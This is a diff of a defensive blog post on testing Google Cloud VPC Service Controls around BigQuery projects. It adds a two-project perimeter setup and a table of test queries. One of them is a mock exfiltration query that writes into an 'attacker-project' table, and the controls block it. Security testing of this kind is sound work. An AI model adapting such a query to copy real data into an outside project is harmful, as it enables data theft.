@@ -188,21 +188,37 @@ If I go back to the victim project, I can still run the exfiltration query. I ne
 This time, I got a big red error in the results panel `VPC Service Controls: Request is prohibited by the organisation's policy. vpcServiceControlsUniqueIdentifier: ....`
 
 <figure markdown="span">
- ![Red error message when the exfiltration query is attempted](./assets/vpcsc_perim_3.webp)
+ ![Red error message when the exfiltration query is attempted](./assets/vpcsc_perim_4.webp)
  <figcaption>Exfiltration query now fails</figcaption>
 </figure>
 
-I can still run normal SQL queries inside the project.
+I can still run normal SQL queries inside the project, but I can't access any resources outside the project, including querying other data in my organisation!
 
-## Final notes
+### Two projects in a perimeter
 
-I suspect the policy as it stands is too restrictive to be useful, as I can't query any datasets from other projects in the org as it stands. My goals here were:
+I suspect the policy as it stands is too restrictive to be useful, as I can't query any datasets from other projects in the org as it stands. It seems that a pragmatic starting point for a simple organisation like this is a perimeter around the org into which I can put projects so that they can interact with one another but not the outside world. This seems to be a straightforward update to my setup.
+
+I go back and add a second project `other-project` to my organisation `test` perimeter. Then, I update the `VPC accessible services` to `all services`. After a minute to settle, I try a few experiments from `victim-project`. I am running as the owner of the projects that are in my orgnisation, so IAM will allow it, only VPC service controls can stop it.
+
+|Test|SQL|Result|
+|----|---|------|
+|query a table in a dataset in `other-project`?|`SELECT * FROM other-project.example.test`|Yes|
+|query a table in a dataset in `pypi-vulns`, in my org but outside the perimeter?|`SELECT COUNT(1) FROM pypi-vulns.published_us.vulnerable_downloads_overall`|No, prohibited by policy|
+|query a table in `bigquery-public-data`?|`SELECT COUNT(1) FROM bigquery-public-data.usa_names.usa_1910_2013`|No, prohibited by policy|
+|exfiltrate to `attacker-project`?|`CREATE OR REPLACE TABLE attacker-project-428619.attacker_dataset.leak_it AS SELECT 1 AS dummy`|No, prohibited by policy|
+
+This seems like a decent starting point!
+
+> Shout-out to this [Medium article giving a more IaC treatment, that mentioned how to use the identifier provided with deny messages to see why it was denied](https://medium.com/@bigface00/guarding-bigquery-enhancing-data-security-with-vpc-service-control-cd2fb37094a2). Very useful facility!
+
+## Summary
+
+My goals here were:
 
 - to make sure I could use these controls :white_check_mark:
 - to be confident that these controls really can prevent the exfiltration risk from BigQuery :white_check_mark:
 - to be confident that these controls can mitigate the exfiltration with in the dbt vulnerability in BigQuery :white_check_mark:
-
-Using this control pragmatically to mitigate the risk whilst still being able to do useful work will take a little more investigation!
+- to get an idea how I might use these controls in practice :white_check_mark:
 
 --8<-- "blog-feedback.md"
 
